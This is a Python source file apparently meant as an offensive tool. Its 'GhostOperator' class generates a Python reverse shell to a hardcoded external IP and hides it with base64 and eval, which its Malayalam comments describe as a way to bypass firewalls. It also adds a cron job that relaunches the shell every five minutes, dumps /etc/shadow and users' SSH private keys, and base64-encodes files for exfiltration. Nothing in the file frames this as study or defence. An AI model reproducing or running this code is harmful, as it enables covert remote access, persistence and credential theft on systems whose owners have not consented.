import base64, random, string

class GhostOperator:
    def __init__(self, target_ip, lhost="104.244.73.190", lport=4444):
        self.target = target_ip
        self.lhost = lhost
        self.lport = lport

    def obfuscate_payload(self, cmd):
        # കമാൻഡിനെ Base64 ആക്കുന്നു
        b64 = base64.b64encode(cmd.encode()).decode()
        # ഫയർവാളിനെ കൺഫ്യൂസ് അടിപ്പിക്കാൻ ജങ്ക് വേരിയബിളുകൾ
        v1 = ''.join(random.choices(string.ascii_lowercase, k=4))
        v2 = ''.join(random.choices(string.ascii_lowercase, k=4))
        # ലെയേർഡ് എക്സിക്യൂഷൻ (Firewall Bypass Logic)
        return f"{v1}='{b64}'; {v2}=$(echo ${v1} | base64 -d); eval ${v2}"

    def get_reverse_shell_cmd(self):
        # പവർഫുൾ പൈത്തൺ റിവേഴ്സ് ഷെൽ
        raw = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        return self.obfuscate_payload(raw)

    def set_persistence(self):
        cmd = self.get_reverse_shell_cmd()
        return self.obfuscate_payload(f"(crontab -l ; echo \"*/5 * * * * {cmd}\") | crontab -")

    def dump_credentials(self):
        raw = "cat /etc/shadow || cat /etc/passwd || cat /home/*/.ssh/id_rsa"
        return self.obfuscate_payload(raw)

    def stealth_exfiltrate(self, file_path):
        return f"cat {file_path} | base64"
